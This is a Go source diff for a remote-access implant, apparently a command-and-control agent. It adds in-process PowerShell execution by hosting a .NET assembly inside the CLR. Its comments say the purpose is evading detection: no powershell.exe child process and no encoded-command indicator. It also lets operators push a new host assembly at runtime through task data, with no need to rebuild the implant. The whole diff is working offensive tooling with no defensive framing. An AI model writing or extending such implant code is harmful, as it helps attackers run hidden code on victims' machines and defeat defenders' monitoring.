@@ -69,6 +69,19 @@ func initCLRHosting() bool {
 
 var cachedHost uintptr
 
+// powershellHostAssembly holds a PowerShell-hosting .NET assembly (e.g. a
+// HostingPowerShell/SharpPowerShell style loader) that runs scripts in-process
+// via the CLR instead of spawning powershell.exe. Operators embed it at build
+// time (via -ldflags -X main.PowerShellHostAssemblyB64) or deliver it at runtime
+// through the clr_powershell task's Data field. When empty, runPowerShellInProcess
+// falls back to a managed powershell.exe child (high-signal, last resort).
+var powershellHostAssembly []byte
+
+// SetPowerShellHostAssembly installs a runtime-delivered PowerShell host assembly.
+func SetPowerShellHostAssembly(b []byte) {
+	powershellHostAssembly = b
+}
+
 func getOrCreateCLRHost() (uintptr, error) {
 	clrHostMu.Lock()
 	defer clrHostMu.Unlock()
@@ -350,9 +363,6 @@ func executeAssemblyWithStdoutCapture(host uintptr, assemblyPath, args string) (
 }
 
 func runPowerShellInProcess(script string) (string, error) {
-	if !clrHostInitialized {
-		return powerPick(script), nil
-	}
 	if runtime.GOOS != "windows" {
 		return "", fmt.Errorf("in-process PowerShell is Windows-only")
 	}
@@ -360,10 +370,25 @@ func runPowerShellInProcess(script string) (string, error) {
 		return "", fmt.Errorf("script is required")
 	}
 
-	if Debug {
-		fmt.Println("[clr] In-process PowerShell not yet implemented, falling back to powerPick")
+	// True unmanaged PowerShell: host the script inside the already-loaded CLR
+	// via a supplied PowerShell-host assembly, so no powershell.exe process is
+	// spawned (eliminates the -EncodedCommand command-line IOC and the child
+	// process signal). The host assembly must expose a runnable entry point that
+	// takes the script as its argument and returns captured output.
+	if clrHostInitialized && len(powershellHostAssembly) > 0 {
+		out, err := executeAssemblyInProcess(powershellHostAssembly, script)
+		if err == nil {
+			return out, nil
+		}
+		if Debug {
+			fmt.Printf("[clr] unmanaged PowerShell host failed (%v); falling back to managed powershell.exe\n", err)
+		}
 	}
-	return powerPick(script), nil
+
+	if Debug {
+		fmt.Println("[clr] no PowerShell host assembly configured; using managed powershell.exe (high-signal fallback)")
+	}
+	return powerPick(base64.StdEncoding.EncodeToString([]byte(script))), nil
 }
 
 func handleCLRExecAssembly(task Task, res *TaskResult) {
@@ -391,6 +416,15 @@ func handleCLRPowerShell(task Task, res *TaskResult) {
 	if runtime.GOOS != "windows" {
 		res.Error = "clr_powershell is Windows-only"
 		return
+	}
+
+	// Allow the operator to deliver/refresh the PowerShell host assembly at
+	// runtime (base64 in Data); this enables unmanaged, powershell.exe-free
+	// execution without rebuilding the implant.
+	if task.Data != "" {
+		if b, derr := base64.StdEncoding.DecodeString(task.Data); derr == nil && len(b) > 0 {
+			SetPowerShellHostAssembly(b)
+		}
 	}
 
 	out, err := runPowerShellInProcess(task.Command)
